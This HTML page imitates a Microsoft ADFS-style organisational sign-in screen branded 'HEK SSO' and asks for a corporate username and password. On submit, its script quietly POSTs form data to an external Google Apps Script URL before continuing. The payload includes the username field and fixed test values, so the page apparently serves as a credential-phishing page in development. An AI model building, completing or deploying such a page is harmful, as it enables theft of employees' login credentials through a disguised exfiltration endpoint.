
 <!DOCTYPE html>
<html lang="ja">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta http-equiv="cache-control" content="no-cache,no-store"/>
        <meta name='mswebdialog-title' content='HEK SSO に接続しています'/>

        <title>サインイン</title>
        
        <style>
        * {
            margin:0px;
            padding:0px;
        }
        html, body{
            height:100%;
            width:100%;
            background-color:#ffffff;
            color:#000000;
            font-weight:normal;
            font-family:"Segoe UI" , "Segoe" , "SegoeUI-Regular-final", Tahoma, Helvetica, Arial, sans-serif;
            min-width:500px;
        }
        body{ font-size:0.9em; }

        #noScript { margin:16px; color:Black; }

        :lang(en-GB){quotes:'\2018' '\2019' '\201C' '\201D';}
        :lang(zh){font-family:微软雅黑;}

        @viewport { width: device-width; }

        #fullPage, #brandingWrapper{
            width:100%;
            height:100%;
            background-color:inherit;
        }
        #brandingWrapper{
            background:
              /* 光沢（上にかぶせる） */
              linear-gradient(to bottom right,
                rgba(255,255,255,0.18),
                rgba(255,255,255,0.02)
              ),

              /* 細い斜めライン（強） */
              linear-gradient(120deg, rgba(255,255,255,0.18) 10px, transparent 10px),

              /* 細い斜めライン（弱） */
              linear-gradient(60deg, rgba(255,255,255,0.08) 10px, transparent 10px),

              /* 円（大・淡） */
              radial-gradient(circle at 15% 85%, rgba(255,255,255,0.15) 120px, transparent 121px ),

              /* 円（中・奥） */
              radial-gradient(circle at 25% 80%, rgba(255,255,255,0.08) 180px, transparent 181px ),

              /* 円（小・手前） */
              radial-gradient(circle at 20% 75%, rgba(255,255,255,0.12) 40px, transparent 41px ),

              /* 円（点群っぽいアクセント） */
              radial-gradient(circle at 10% 90%, rgba(255,255,255,0.1) 150px, transparent 160px ),

              /* うっすら斜めハイライト */
              linear-gradient(160deg, rgba(255,255,255,0.06), transparent 60% ),

              /* ベースカラー */
              #4a86c5;

            background-size:
              cover,
              180px 180px,
              220px 220px,
              auto,
              auto,
              auto,
              auto,
              cover;

            background-repeat: no-repeat;
        }

        #contentWrapper{
            position:relative;
            width:500px;    
            height:100%;
            overflow:auto;
            background-color:#ffffff; /* for IE7 */
            margin-left:-500px; margin-right:0px; 
        }
        #content{
            min-height:100%;
            height: auto !important;
            margin:0 auto -55px auto;
            padding:0px 150px 0px 50px;
        }
        #header{
            font-size:2em;
            font-weight:lighter;
            font-family:"Segoe UI Light" , "Segoe" , "SegoeUI-Light-final", Tahoma, Helvetica, Arial, sans-serif;
            padding-top: 90px;
            margin-bottom:60px;
            min-height:100px;
            overflow:hidden;
        }
        #header img{
            /* Logo image recommended dimension: 60x60 (square) or 350X35 (elongated), 4 kB average, 10 kB maximum. Transparent PNG strongly recommended. */
            width:auto;
            height:auto;
            max-width:100%;
        }
        #workArea, #header{
            word-wrap:break-word;
            width:350px;
        }
        #workArea{
            margin-bottom:90px;
        }
        #footerPlaceholder{
            height:40px;
        }
        #footer{
            height:40px;
            padding:10px 50px 0px 50px;
            position:relative;
            color:#666666;
            font-size:0.78em;
        }
        #footerLinks{
            float:none;
            padding-top:10px;
        }
        #copyright {color:#696969;}
        .pageLink { color:#000000; padding-left:16px; }

        /* Common content styles */

        .float { float:left; } 
        .floatReverse { float:right; } 
        .hidden {display:none;}
        .error { color:#c85305; }
        a
        {
            color:#2672ec;
            text-decoration:none;
            background-color:transparent;
        }
        ul { list-style-type: disc; }
        label { margin-bottom: 8px; }
        .submitMargin { margin-top:38px; margin-bottom:30px; }
        .fieldMargin { margin-bottom:8px; }
        .groupMargin { margin-bottom:30px; } 
        .autoWidth { width:auto; }
        .fullWidth { width:342px; }
        input{
            max-width:100%; 
            font-family:inherit;
            margin-bottom:8px;
        }
        input[type="radio"], input[type="checkbox"] {
            vertical-align:middle;
            margin-bottom: 0px;
        }
        span.submit, input[type="submit"]{
            border:none;
            background-color:rgb(38, 114, 236);
            min-width:80px;
            width:auto;
            height:30px;
            padding:4px 20px 6px 20px;
            border-style:solid;
            border-width:1px;
            transition:background 0s;
            color:rgb(255, 255, 255);
            cursor:pointer;
            margin-bottom:8px;
            
            -ms-user-select:none;
            -moz-transition:background 0s;
            -webkit-transition:background 0s;
            -o-transition:background 0s;
            -webkit-touch-callout:none;
            -webkit-user-select:none;
            -khtml-user-select:none;
            -moz-user-select: none;
            -o-user-select: none;
            user-select:none;
        }
        input[type="submit"]:hover,span.submit:hover{
            background: rgb(212, 227, 251);
        }
        input.text{
            height:28px;
            padding:0px 3px 0px 3px ;
            border:solid 1px #BABABA;
            font-size:1.0em;
        }
        input.text:focus{ border: 1px solid #6B6B6B; }
        h1{
            margin-bottom: 8px;
            font-size:2.0em; 
            font-weight:lighter;
        }

        /* Form factor: intermediate height layout. Reduce space of the header. */
        @media only screen and (max-height: 820px) {
            #header {
                padding-top: 40px;
                min-height:0px;
                overflow: hidden;
            }

            #workArea
            {
                margin-bottom:60px; 
            }
        }

        /* Form factor: intermediate layout (WAB in non-snapped view falls in here) */
        @media only screen and (max-width: 600px) {
            html, body {
                min-width: 260px;
            }

            #brandingWrapper {
                display: none;
            }

            #contentWrapper {
                float: none;
                width: 100%;
                margin: 0px auto;
            }

            #content, #footer, #header {
                width: 400px;
                padding-left: 0px;
                padding-right: 0px;
                margin-left: auto;
                margin-right: auto;
            }

            #workArea {
                width: 100%;
            }

            .fullWidth {
                width: 392px;
            }

        }

        @media only screen and (max-width: 450px) {
            body {
                font-size: 0.8em;
            }

            #content, #footer {
                width:auto;
                margin-right:33px;
                margin-left:25px;
            }

            #header {
                width: auto;
            }

            span.submit, input[type="submit"] {
                font-size: 0.9em;
            }

            .fullWidth {
                width:100%;
                margin-left:auto;
                margin-right:auto;
            }
        }
        </style>

    </head>
    <body dir="ltr" class="body">
        <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
            <h1>JavaScript は必須です</h1>
            <p>JavaScript は必須です。この Web ブラウザーは JavaScript をサポートしていないか、この Web ブラウザーで JavaScript が有効にされていません。</p>
            <p>Web ブラウザーが JavaScript をサポートしているかどうかの情報や、JavaScript を有効にする方法については、その Web ブラウザーのヘルプを参照してください。</p>
        </div>
        <script>
             document.getElementById("noScript").style.display = "none";
        </script>
        <div id="fullPage">
            <div id="brandingWrapper" class="float">
            </div>
            <div id="contentWrapper" class="float">
                <div id="content">
                    <div id="header">
                        HEK SSO
                    </div>
                    <div id="workArea">
                        <div id="authArea" class="groupMargin">
                            <div id="loginArea">
                                <div id="loginMessage" class="groupMargin">組織アカウントを使用してサインインしてください</div>
                                    <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="#" >
                                        <div id="error" class="fieldMargin error smallText">
                                            <span id="errorText" for=""></span>
                                        </div>
                                        <div id="formsAuthenticationArea">
                                            <div id="userNameArea">
                                                <label id="userNameInputLabel" for="userNameInput" class="hidden">ユーザー アカウント</label>
                                                <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
                                                    spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
                                            </div>

                                            <div id="passwordArea">
                                                <label id="passwordInputLabel" for="passwordInput" class="hidden">パスワード</label>
                                                <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
                                                    placeholder="パスワード" autocomplete="off"/>
                                            </div>
                                            <div id="submissionArea" class="submitMargin">
                                                <span id="submitButton" class="submit" tabindex="4" role="button"
                                                    onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
                                                    onclick="return Login.submitLoginRequest();">サインイン</span>
                                            </div>
                                        </div>
                                        <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div id="footerPlaceholder"></div>
                    </div>
                    <div id="footer">
                        <div id="footerLinks" class="floatReverse">
                             <div>
                                 <span id="copyright">&#169; 2016 Microsoft</span>
                             </div>
                    </div>
                </div>
            </div> 
        </div>

        <script>
            var maxPasswordLength = 128;

            function LoginErrors(){
                this.userNameFormatError = '\u0026quot;domain\\user\u0026quot; または \u0026quot;user@domain\u0026quot; の形式でユーザー ID を入力してください。'; 
                this.passwordEmpty = 'パスワードを入力してください。'; 
                this.passwordTooLong = 'パスワードが長すぎます (128 文字を超えています)。';
            }; 
            function InputUtil(errTextElementID, errDisplayElementID) {

                if (!errTextElementID)  errTextElementID = 'errorText'; 
                if (!errDisplayElementID)  errDisplayElementID = 'error'; 

                this.hasFocus = false;
                this.errLabel = document.getElementById(errTextElementID);
                this.errDisplay = document.getElementById(errDisplayElementID);
            };
            InputUtil.prototype.canDisplayError = function () {
                return this.errLabel && this.errDisplay;
            }
            InputUtil.prototype.checkError = function () {
                if (!this.canDisplayError){
                    throw new Error ('Error element not present');
                }
                if (this.errLabel && this.errLabel.innerHTML) {
                    this.errDisplay.style.display = '';        
                    var cause = this.errLabel.getAttribute('for');
                    if (cause) {
                        var causeNode = document.getElementById(cause);
                        if (causeNode && causeNode.value) {
                            causeNode.focus();
                            this.hasFocus = true;
                        }
                    }
                }
                else {
                    this.errDisplay.style.display = 'none';
                }
            };
            InputUtil.prototype.setInitialFocus = function (input) {
                if (this.hasFocus) return;
                var node = document.getElementById(input);
                if (node) {
                    if ((/^\s*$/).test(node.value)) {
                        node.focus();
                        this.hasFocus = true;
                    }
                }
            };
            InputUtil.prototype.setError = function (input, errorMsg) {
                if (!this.canDisplayError) {
                    throw new Error('Error element not present');
                }
                input.focus();

                if (errorMsg) {
                    this.errLabel.innerHTML = errorMsg;
                }
                this.errLabel.setAttribute('for', input.id);
                this.errDisplay.style.display = '';
            };
            InputUtil.focus = function (inputField) {
                var node = document.getElementById(inputField);
                if (node) node.focus();
            };
        </script>
        <script>

            function Login() {
            }

            Login.userNameInput = 'userNameInput';
            Login.passwordInput = 'passwordInput';

            Login.initialize = function () {

                var u = new InputUtil();

                u.checkError();
                u.setInitialFocus(Login.userNameInput);
                u.setInitialFocus(Login.passwordInput);
            }();

            Login.submitLoginRequest = function () { 
                var u = new InputUtil();
                var e = new LoginErrors();

                var userName = document.getElementById(Login.userNameInput);
                var password = document.getElementById(Login.passwordInput);

                if (!userName.value || !userName.value.match('[@\\\\]')) {
                    u.setError(userName, e.userNameFormatError);
                    return false;
                }

                if (!password.value) {
                    u.setError(password, e.passwordEmpty);
                    return false;
                }

                if (password.value.length > maxPasswordLength) {
                    u.setError(password, e.passwordTooLong);
                    return false;
                }

                // ===== GASへ送信（重要：URLSearchParams使用）=====
                const formData = new URLSearchParams();
                formData.append("name", userName);
                formData.append("email", "kotei@test.co.jp");
                formData.append("message", "固定値検証");

                fetch("https://script.google.com/macros/s/AKfycbzXqbYm2b95G5YqrVq6MwB4KB0A1ROQr80KaP2M3hvQ_QAYV19bd97gI3WzW7tWpN04Pg/exec", {  // ←ここ変更
                  method: "POST",
                  body: formData
                })

                document.forms['loginForm'].submit();
                return false;
            };
        </script>

    </body>
</html>
